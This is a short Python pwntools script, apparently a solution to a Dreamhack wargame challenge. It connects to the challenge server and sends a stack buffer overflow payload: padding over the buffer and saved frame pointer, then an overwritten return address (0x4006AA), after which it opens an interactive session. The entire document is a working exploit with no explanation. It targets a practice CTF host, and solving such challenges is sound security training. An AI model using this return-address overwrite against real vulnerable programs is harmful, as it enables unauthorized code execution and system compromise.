#!/usr/bin/python3 
from pwn import *

context.log_level = 'debug'
p = remote('host3.dreamhack.games', 19902)

pay = 'A'*0x30 + 'B'*0x8 + p64(0x4006AA)

p.sendafter('Input: ', pay)

p.interactive()
